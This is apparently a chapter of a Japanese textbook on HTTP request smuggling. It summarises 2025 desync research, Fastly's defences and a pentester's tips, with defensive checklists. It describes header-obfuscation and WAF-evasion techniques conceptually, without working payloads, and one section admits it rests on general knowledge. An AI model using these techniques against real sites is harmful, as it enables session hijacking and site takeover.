- **未対応（2025 年時点）**: nginx, Akamai, CloudFront, Fastly。→ 防御者はこれらのベンダに「上流 HTTP/2 の実装ロードマップ」を要求せよ、というのが具体的な call to action。

#### 2. 上流 HTTP/1.1 が避けられない場合の緩和（いずれも不完全）

- フロントエンドで**あらゆる正規化・検証機能を有効化**する。
- GET/HEAD/OPTIONS など本文を必要としないメソッドで**本文付きリクエストを拒否**する。
- **上流コネクション再利用を無効化**する（性能低下と引き換え。ユーザ間でコネクションが共有されなければ desync のインパクトが激減する）。
- 実装が枯れた Apache/nginx を優先し、ニッチな Web サーバを避ける。
- HTTP Request Smuggler v3.0 / HTTP Hacker で**定期スキャン**する。

#### 3. 不十分な対策（やってはいけない過信）

- **正規表現ベースの WAF による Expect/Transfer-Encoding ブロック**: 難読化で容易に回避される。
- **タイムアウトベースの検知**: フィンガープリンティングで見破られる。
- **応答ヘッダの除去**: 2 つ目の Expect ヘッダブロックで回避される。

Kettle の結論は一貫している。「6 年間の個別緩和は問題を隠しただけだ。新しい desync 攻撃は常にやって来る。土台である上流 HTTP/1.1 を捨てないかぎり、終盤戦は終わらない。」

> 出典: http1mustdie.com — https://http1mustdie.com

### 数字で見るインパクト（2025 年時点）

| 項目 | 数値 |
| --- | --- |
| 2025 年研究で得たバグバウンティ総額 | $350,000 超 |
| 最初の 2 週間で得た額 | $200,000 超 |
| Cloudflare のバグで露出したサイト数 | 2,400 万（24M） |
| Akamai 手法でコミュニティが得た報奨（件数／総額） | 74 件／$221,000 |
| Akamai の研究者個人への報奨 | $9,000 |
| CVE-2025-32094 のホットフィックス→完全解消 | 65 日 |
| 個別緩和が問題を「隠していた」年数 | 6 年（2019–2025） |
| リリースされた検出ツール | HTTP Request Smuggler v3.0（OSS） |
| Web Security Academy の関連ラボ | 20 以上 |

（研究チーム: James Kettle ほか Paolo Arnolfo, Guillermo Gregorio, Francesco Mariani。報奨の一部は英国の慈善団体 42nd Street に寄付された。）

### この節のまとめ

- HTTP/1.1 はボディ長の指定方法が複数（CL / TE / 0 / H2 ダウングレード）ありテキストベースゆえ、フロントとバックの**パーサ不一致が構造的に不可避**。これが desync の根本原因。
- 2025 年の新クラスは **0.CL**（早期応答ガジェットでデッドロックを打破）、**ダブルデシンク**（0.CL→CL.0 へ変換して武器化）、そして最も実り多い **Expect 系 desync**（バニラ／難読化で WAF 回避）。
- 実証事例は T-Mobile、**Akamai / CVE-2025-32094**（auth.lastpass.com に sky.com を配信）、Netlify、GitLab、Cloudflare（2,400 万サイト）。
- 検出は既製ペイロードではなく **V-H / H-V のパーサ不一致をプローブで炙り出す**方法論へ転換（HTTP Request Smuggler v3.0）。
- 防御の本命は**上流 HTTP/2 への移行**。正規表現 WAF・タイムアウト検知・ヘッダ除去はいずれも回避され、根治にならない。個別パッチではなく土台の刷新が必要——それが「Desync Endgame（終盤戦）」の含意である。

> 出典: HTTP/1.1 Must Die: The Desync Endgame — https://portswigger.net/research/http1-must-die

## (e) Desync Endgame の動画・CDN応答・実践Tips

これまでの節では、2025年の「HTTP/1.1 Must Die: The Desync Endgame」研究がどのようなクラスの脆弱性（0.CL、CL.0、Expectベースdesync など）を発見したかを見てきた。本節では、その研究成果が実際に業界にどう波及したかを3つの異なる視点から確認する。すなわち、(1) 研究者本人による講演での主張、(2) 標的とされたCDN事業者（Fastly）側の公式な応答、(3) 攻撃側の知見をどう防御・検知に転用し、ペネトレーションテスターとして実務に組み込むかという実践Tips、の3つである。原理を学ぶだけでなく「業界がどう動いたか」を追うことは、防御側がリスクをどう評価すべきかを判断するうえで欠かせない。

### 1. RomHack 2025 講演「HTTP/1.1 Must Die! The Desync Endgame」

> ⚠️ **未取得の資料**: この動画（YouTube: RomHack 2025、James "albinowax" Kettle 氏による講演）は、字幕・書き起こしデータが取得できず、動画ページからは説明欄やメタデータ以上の内容を自動取得できませんでした（理由: YouTubeページの本文取得では動画概要欄・字幕本体にアクセスできず、タイトルと登壇者情報のみ確認できた）。詳細な発表内容をご覧になりたい場合は、以下のURLからご自身で直接ご視聴ください: https://www.youtube.com/watch?v=zr5y6Bapbnw

（以下は未取得資料の補足として一般知識に基づく解説です）

この講演は、同年の Black Hat USA 2025 で発表された研究「HTTP/1.1 Must Die: The Desync Endgame」（James Kettle, PortSwigger Research）の内容を、欧州のセキュリティカンファレンスである RomHack 2025 向けに再構成したものである。Black Hat 版の発表と対になる白書は `http1mustdie.com` および PortSwigger Research のページで公開されており、CVE番号（CVE-2025-32094 として言及されているものを含む）が付与された脆弱性クラスも扱われている。

講演で示された核心的な主張は一貫して次の一点に集約される。

> HTTP/1.1 は、リクエストとリクエストの**境界**（あるリクエストがどこで終わり、次のリクエストがどこから始まるか）を、フロントエンド（CDN・リバースプロキシ・ロードバランサ）とバックエンド（オリジンサーバ）の双方が「同じように解釈すること」を前提にした設計になっている。しかし実装レベルでは、この前提はほぼ常に破られている。

この「境界の合意」がなぜ壊れやすいかは、これまでの章で扱った CL.TE / TE.CL といった古典的な desync パターンから、2025年に新たに体系化された **0.CL**（フロントエンドは Content-Length も Transfer-Encoding も指定されていない＝ボディなしと解釈するが、バックエンドは何らかのヘッダーの残骸や別の合図から追加データをボディとして読み込んでしまうパターン）や **CL.0**（逆に、フロントエンドは Content-Length を尊重してボディを転送するが、バックエンドは何らかの理由でボディ長を0として扱い、残りのバイト列を次のリクエストの先頭として再解釈してしまうパターン）に至るまで、共通する根本原因である。さらに **Expect ベースの desync** は、`Expect: 100-continue` ヘッダーの扱いの違い（100 Continue を送るタイミング、ボディの先読み挙動、無効な Expect 値への耐性）を突いた新しいクラスとして、この2025年の研究で初めて体系的に武器化された。

講演で示されたインパクトの規模感として、この研究は「数千万規模のウェブサイト」に影響し、主要テック企業や米国政府機関のシステムを含む多数の標的で認証情報の窃取（session hijacking）やサイト乗っ取りにつながる実証がなされたと報告されている。これは、desync 攻撃が「理論上のプロトコル欠陥」ではなく、2025年時点でもなお現実の重大インシデントを生み出しうる攻撃面であることを裏付けている。

講演の結論として提示される防御的メッセージも明快である。すなわち「HTTP/1.1 は本質的にリクエスト境界の一貫した解釈を保証できないプロトコルであり、真の解決は接続の端から端まで（エンドツーエンド）を HTTP/2 以上に統一することでしか得られない」という主張である。これは次項で紹介する Fastly の対応（HTTP/2・HTTP/3 へのダウングレード時の厳格な変換制御）とも整合する。

> 出典: RomHack 2025 - James "albinowax" Kettle - HTTP/1.1 Must Die! The Desync Endgame — https://www.youtube.com/watch?v=zr5y6Bapbnw （関連: Black Hat USA 2025 白書 `US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf`、PortSwigger Research ページ `https://portswigger.net/research/http1-must-die`）

### 2. Fastly の公式応答「Fastly's Resilience to HTTP/1.1 Desynchronization Attacks」

James Kettle の2025年の研究発表を受けて、CDN事業者である Fastly は自社インフラがこれらの攻撃クラスに対してどう耐性を持ってきたかを説明する技術ブログを公開した。CDN事業者の視点は、これまでの章で見てきた「攻撃側」の視点を補完する重要な資料であり、なぜある実装は desync に強く、ある実装は弱いのかという設計判断の対比を学べる。

#### 脆弱性の本質を「パーサの不一致」として捉え直す

Fastly はまず、desync 攻撃の根本原因を「パーサの不一致（parser discrepancy）」という言葉で定義し直している。これは、本教科書でこれまで CL.TE / TE.CL として説明してきた現象を、より一般化した表現である。HTTP/1.1 では、リクエストボディの長さを指定する方法が `Content-Length` と `Transfer-Encoding: chunked` という**2通り**存在し、さらに両方が同時に指定された場合の優先順位づけ、どちらも指定されない場合のデフォルト挙動、不正な値（負数、非数値、大文字小文字混在の `chunked`、余分な空白など）への耐性が実装ごとに異なる。この「解釈の自由度」こそが攻撃面の源泉である、という整理は、これまでの章のCL.TE/TE.CL解説と同じ原理を、CDN事業者側の言葉で裏づけるものである。

#### Fastly のアーキテクチャ上の防御策

ブログで説明されている防御の柱は次の4点に整理できる。

**(1) 単一パーサ実装によるスタック全体の統一**

Fastly は、エッジ（フロントエンド）とその後段の内部コンポーネントの両方で**同一のHTTPパーサ実装**を用いている。これは、CL.TE/TE.CL 攻撃がそもそも「フロントエンドとバックエンドが異なるパーサ実装（異なるソフトウェア、異なるベンダー）を使っているために解釈がずれる」ことに起因する、という構造的原因に対する直接的な対策である。両者が物理的に同じコードでリクエストを解析すれば、原理的に「片方だけがヘッダーを見落とす／どちらか一方だけがチャンクを誤読する」といった不一致は発生しえない。

なぜこれが強力な防御になるかを仕組みレベルで説明すると、従来型の多層アーキテクチャ（CDNのフロントエンドNginx → 内部ロードバランサ → アプリケーションサーバのような多段構成）では、各層が独立したソフトウェアスタックとして開発・保守されているため、開発者が異なれば「曖昧なヘッダーをどう扱うか」というエッジケースの実装判断も自然とばらつく。単一パーサをスタック全体で共有するという設計は、この「ばらつきの発生源」自体を組織的に排除するアプローチである。

**(2) ネットワークエッジでの曖昧なリクエストの即時拒否**

Fastly は、リクエストの境界が一意に確定できない（＝曖昧である）と判定した HTTP/1.1 リクエストを、後段に転送する前にネットワークエッジの時点で拒否する。これは「疑わしきは通過させない」という設計判断であり、たとえば Content-Length と Transfer-Encoding が矛盾した形で同時に存在するリクエストや、不正な chunked エンコーディング（本教科書で扱った "funky chunks" のような細工）を検出した時点で、後続処理に一切渡さずに切断する。

**(3) 厳格なリクエストの正規化・再構築**

エッジを通過したリクエストについても、そのまま右から左へ転送するのではなく、Fastly 側で標準形に**正規化・再構築**してから後段に送る。これにより、たとえ入力段階で曖昧さを含みうる表現（例えば冗長な空白、大文字小文字の揺れ、重複ヘッダーなど）があっても、後段のコンポーネントに渡る時点では常に一意で予測可能な形式に統一される。これは、desync 攻撃が「フロントエンドを通過した後もなお元の（細工された）バイト列がそのまま後段に残る」ことを前提にする攻撃パターンを無効化する。

**(4) HTTP/2・HTTP/3 へのダウングレード／アップグレード時の制御されたプロトコル変換**

現代のCDNでは、クライアントとエッジの間は HTTP/2 や HTTP/3 で接続されていても、エッジとオリジンサーバの間は HTTP/1.1 のままというケースが多い（この不一致自体が H2.TE のような desync クラスの温床になることは、前節までで扱った通りである）。Fastly は、このプロトコル変換の過程を「制御された変換（controlled protocol translation）」として扱い、変換の入出力双方で厳格な検証を行うとしている。

#### 標準への態度：「IETF標準は床であって天井ではない」

Fastly のブログで印象的な一文として引用されているのが次の主張である。

> "We believe the IETF standards are the floor, not the ceiling"（IETF標準は最低ラインであって、目指すべき上限ではない）

これは、RFC 9112（HTTP/1.1のメッセージング仕様）が許容している範囲内の実装であっても、desync 攻撃に悪用されうる「解釈の余地」がある限り、Fastly は RFC が要求する以上に厳格な検証を自主的に課す、という方針を意味する。具体例として、不正な形式の `Expect` ヘッダーを無条件に拒否する（RFC上はエラー応答の返し方に幅があるが、Fastly は疑わしい入力そのものを受理しない）という挙動が挙げられている。これは、標準仕様の「曖昧さを許容する部分」こそが攻撃者にとっての付け入る隙であるという、本教科書全体を貫く教訓と直結する。

#### 過去の攻撃波との対応関係（時系列）

ブログでは、Fastly がこれまで各年に登場した desync 攻撃の変種に対してどう耐性を示してきたかが年表として整理されている。防御側の視点で見ると、この年表は攻撃技術の進化そのものの記録でもある。

| 年 | 登場した攻撃クラス | 備考 |
|---|---|---|
| 2019 | CL.TE / TE.CL | James Kettle による古典的な desync 研究（"HTTP Desync Attacks"）で体系化された基礎クラス |
| 2021 | H2.CL / H2.TE | HTTP/2からHTTP/1.1へのダウングレード時の不一致を突くクラス |
| 2022 | CL.0 | バックエンドがContent-Lengthを0として扱ってしまうクラス |
| 2024 | TE.0 および "funky chunks" | 不正なchunkedエンコーディングの表現ゆれを利用するクラス |
| 2025 | Expectベースのdesync、0.CL | 2025年の「Desync Endgame」研究で新たに体系化。競合CDNでは合計35万ドル以上のバグバウンティ支払いが発生したとされる |

Fastly はこの年表を提示したうえで、自社は日次1.8兆件（1.8 trillion）ものHTTPリクエストを処理しながら、2025年のBlack Hatで開示された「数千万サイトに影響する」とされる脆弱性群に対して免疫があることを確認済みである、と結んでいる。この規模の数字が示す実務的な意味は、CDNのような超大規模インフラでは、たとえ発生確率が低いエッジケースであっても、絶対件数としては無視できない被害につながりうるということである。だからこそ「単一パーサ」「エッジでの即時拒否」「正規化」「制御されたプロトコル変換」という多層的な防御を組み合わせる設計思想が要求される。

防御側のチェックリストとして、自組織のCDN・リバースプロキシ構成を評価する際は、次の観点を確認するとよい。

- フロントエンドとバックエンドで、HTTPパーサの実装（ソフトウェア、バージョン）が異なっていないか。異なる場合、Content-Length と Transfer-Encoding の両方が指定されたリクエストをそれぞれどう扱うか、実際に検証したか。
- 曖昧なリクエスト（矛盾するヘッダー、不正なchunked表現）を後段に転送する前に拒否する仕組みがあるか。
- HTTP/2やHTTP/3からHTTP/1.1へのダウングレードが発生する境界で、擬似ヘッダーや長さ情報の変換が厳格に検証されているか。
- ベンダーやCDNのセキュリティアドバイザリで、CL.TE/TE.CL/H2.TE/CL.0/TE.0/0.CL/Expectベースの各クラスへの対応状況が明記されているか。

> 出典: Fastly's Resilience to HTTP/1.1 Desynchronization Attacks — https://www.fastly.com/blog/fastlys-resilience-to-http-1-1-desynchronization-attacks

### 3. Tom Stacey 「How to join the desync endgame: Practical tips from pentester Tom Stacey」

PortSwigger のブログで公開されたこの記事は、著者自身が「Kettle 級の新規クラス発見」を狙うのではなく、既存の研究成果と強化されたツールを実務（ペネトレーションテスト・バグバウンティ）でどう活用し、限られた時間の中で成果を出すかという**実践的な立ち位置**から書かれている点が特徴である。本教科書の読者、すなわち中〜上級者が「明日から何をすればよいか」を考えるうえで、最も直接的に役立つ資料である。

#### desync 探索の第一原則：「リクエストは嘘をつく」

記事の中心的な考え方は "requests are a lie"（リクエストは嘘である）というフレーズに集約される。これは、クライアントが送ったつもりのリクエスト内容と、サーバ（特に多段のプロキシチェーンの最終的な受信者）が実際に解釈する内容は、必ずしも一致しないという意味である。この態度を持つことが、desync ハンティングの出発点になる。実務的には、HTTP リクエストを「意味のある構造化データ」としてではなく、**生のバイト列**として捉え直す視点が要求される。ヘッダー名の大文字小文字、空白の有無、改行コードの種類（CRLF か LF のみか）、ヘッダーの重複、行末の余分な文字――これらはすべて、人間にとっては些末な差異でも、パーサの実装によっては解釈が分かれる潜在的な攻撃面になりうる。

#### 初心者が陥りやすい罠：パイプライニングとの混同

実務上の重要な注意点として、記事は「HTTPパイプライニング（1つのTCP接続上で複数のリクエストを応答を待たずに連続送信する仕組み）と、リクエストスミグリングを混同しないこと」を強調している。パイプライニングは正当な仕様であり、それ自体は脆弱性ではない。しかし、desync の検証時に送信した複数リクエストが「単にパイプライニングとして正しく処理されただけ」なのか、「本当にリクエスト境界がずれて後続リクエストに影響を与えたのか」を見誤ると、誤検知（偽陽性）や逆に見逃し（偽陰性）につながる。この区別を正確につけられることが、desync ハンティングの前提条件になる。

#### 新しい発見手法：Parser Discrepancy Scan

記事で紹介されている最新のスキャン手法が **Parser Discrepancy Scan**（パーサ不一致スキャン）である。これは、HTTPヘッダーの解釈がフロントエンドとバックエンドで食い違う箇所を機械的に検出することに焦点を当てた手法であり、従来の「特定のペイロードを送って応答の遅延やエラーを観察する」タイミングベースの検出よりも広い範囲を体系的にカバーできる。記事では、この手法が「desync研究のきっかけを雪崩式に増やす」効果があると述べられており、実際に PortSwigger の公式ツール **HTTP Request Smuggler**（Burp Suite 拡張、GitHub: `PortSwigger/http-request-smuggler`）の 2025年リリースであるバージョン3.0で、この検出ロジックが実装に取り込まれている。

#### HTTP Request Smuggler 拡張のカスタマイズ手法

ツールをそのまま使うだけでなく、独自の検証パターンを追加していくことが差別化につながる、という立場から、記事では拡張のための3つの具体的な方法が紹介されている。

**(1) SignificantHeader によるヘッダー追加（最も手軽な方法）**

もっとも取り組みやすい拡張方法として、ツールの設定に新しい「意味のあるヘッダー」を登録する方法が示されている。概念的には次のような形で、ヘッダー名・値・そのヘッダーが「有効(valid)」か「無効(invalid)」かをツールに教える。

```
SignificantHeader("ラベル", "ヘッダー名", "値", isValid)
```

既存の実装例として、`Host` ヘッダーが無効な値を持つケースと、値が欠落しているのに有効として扱われるケース（Host-invalid / Host-valid-missing）、および `Content-Length` が無効な値を持つケースと有効なケース（CL-invalid / CL-valid）が挙げられている。なぜこの仕組みが有効かというと、desync攻撃の多くは「あるヘッダーの値がフロントエンドでは無視される（無効と判定される）が、バックエンドでは有効な値として処理される」というギャップを突くものであり、このギャップを機械的に総当たりで探索できるようにすることが、SignificantHeaderの狙いだからである。読者が独自に「このCDNやミドルウェアはこのヘッダーをどう扱うか」という仮説を持った場合、コードを大きく書き換えずに設定を追加するだけで検証を自動化できる。

**(2) Permutation（順列）によるヘッダーの隠蔽技法**

2つ目の手法は、特定のヘッダーを、あるプロキシやバックエンドから「見えないように」偽装するテクニックである。例として、ヘッダー名の後ろにタブ文字を2つ挿入するといった、微細なバイト単位の変更が挙げられている。これは、ある実装がヘッダー名の完全一致でしかヘッダーを認識しない一方、別の実装は前後の空白やタブをトリムしてから認識する、という**パーサ間の寛容さの違い**を突くものである。この技法により、たとえば「フロントエンドには見えているが、バックエンドには見えていない `Content-Length`」や、逆に「バックエンドにだけ見えている `Transfer-Encoding`」を作り出すことができ、それが結果としてCL.TEやTE.CLのような不一致を人為的に発生させる土台になる。

**(3) HTTPメソッド（動詞）を変えた検証ストラテジーの追加**

3つ目の手法は、通常 GET や POST でしか試さない検証パターンを、`OPTIONS` のような他のHTTPメソッドでも試すというものである。これは一見地味だが、多くのバックエンド実装やミドルウェアはメソッドごとにボディの扱い（そもそもボディを読むかどうか、Content-Lengthの検証を行うかどうか）が異なるため、標準的なメソッドでは検出できない不一致が、非標準的なメソッドの組み合わせでのみ顕在化するケースがある。

#### 限られた時間で成果を出すための3つの戦略

記事では、ペンテスターやバグバウンティハンターが実際の稼働時間の中でdesyncを探す際の優先順位づけとして、次の3つの戦略が提示されている。

1. **スピード重視の戦略**：最新版のツール（Parser Discrepancy Scan を含む HTTP Request Smuggler v3.0 など）を使い、対象範囲を素早く広くスキャンする。短時間の関与で成果を出す必要がある場合に適している。
2. **徹底性重視の戦略**：大規模な対象（多数のエンドポイント、多数のバックエンドが混在する環境）に対して、異なるバックエンドの組み合わせを網羅的にテストする。時間をかけられる場合に、見落としを減らす。
3. **革新性重視の戦略**：既存の検出パターンでは見つからない、未検証の検出技法そのものを開発する。記事はこれを「もっとも効果的」な戦略として位置づけている。これは、ツールを使う側から、ツールを拡張・発展させる側に回ることを意味しており、上記(1)〜(3)のカスタマイズ手法がまさにその実践例である。

#### CDNを狙う際の心構え

記事は「主要な3つのCDNが、合計35万ドル（$350,000）以上のバグバウンティ報奨金の支払いを受けるほどの侵害を受けた」という事実に言及し、CDNが desync 攻撃に対して依然として脆弱な標的でありうることを示している。これは前項で見たFastlyの自己申告的な「耐性の高さ」と対照的であり、CDN事業者によって防御の成熟度に差があることを示唆している。防御側の教訓としては、自組織が利用しているCDNベンダーが、どの攻撃クラス（CL.TE/TE.CL/H2.TE/CL.0/TE.0/0.CL/Expectベース）に対して明示的な対策を公表しているかを確認し、公表がないベンダーについては追加のリスク評価（WAFルールの追加、オリジン側でのリクエスト検証強化など）を検討することが望ましい。

#### 学習の進め方（推奨される段階的アプローチ）

最後に記事は、これから desync ハンティングを始める読者向けに、次のような段階的な学習パスを提示している。

1. HTTP/1.1 の仕様（RFC 9112 相当）そのものを基礎から理解する。
2. PortSwigger Web Security Academy の該当ラボ（Request Smuggling関連の演習室）で手を動かして基本パターンを体得する。
3. **HTTP Hacker** ツールなどを使い、実際のバイト列のやり取りを可視化しながら学ぶ。生のTCPストリームを目で追うことで、「なぜこのペイロードがずれを生むのか」という直感を養う。
4. James Kettle をはじめとする関連研究論文・白書（"HTTP Desync Attacks"（2019）、"HTTP/1.1 Must Die"（2025）など）を通読し、体系的な知識に接続する。

この学習パスは、本教科書がこれまでの章で辿ってきた構成（基礎原理 → 古典的なCL.TE/TE.CL → CDN固有の変種 → 2025年の新クラス）とも対応しており、読者は本教科書の各章を読み進めること自体が、この推奨学習パスをなぞる形になっている。

> 出典: How to join the desync endgame: Practical tips from pentester Tom Stacey — https://portswigger.net/blog/how-to-join-the-desync-endgame-practical-tips-from-pentester-tom-stacey

### まとめ：3つの視点をどう統合するか

本節で扱った3つの資料は、同じ2025年の「Desync Endgame」研究を、それぞれ異なる立場から照射している。

- **研究者（Kettle）の視点**：HTTP/1.1というプロトコル自体の構造的欠陥を指摘し、根本解決はHTTP/2以上への統一だと主張する、いわば「診断」の視点。
- **CDN事業者（Fastly）の視点**：与えられたプロトコルの制約の中で、実装レベル（単一パーサ、正規化、エッジでの拒否、プロトコル変換の制御）でいかに耐性を確保するかという、「治療」の視点。
- **実務家（Stacey）の視点**：発見された脆弱性クラスと強化されたツールを、限られた稼働時間の中でどう活用して現実の対象から検出するかという、「臨床」の視点。

防御目的でこの分野に取り組む読者にとって重要なのは、この3つの視点が独立ではなく連動しているという点である。研究者が新しいクラスを発見すると、CDN事業者はそれに対応した実装変更を行い、実務家はその変更が本当に有効かを検証する新しいツールを作る。この循環が続く限り、「HTTP/1.1 が使われ続ける限りdesyncのリスクはゼロにならない」という前提に立ち、パーサの統一・厳格な正規化・多層防御という設計原則を自組織のインフラに適用し続けることが、実務上できる最善の対応である。

---

[← 第3章 スマグリング基礎クラス：CL.TE / TE.CL / TE.TE](03-smuggling-basics.md) ・ [📖 目次](index.md) ・ [第5章 発展的スマグリング技法 →](05-advanced-techniques.md)
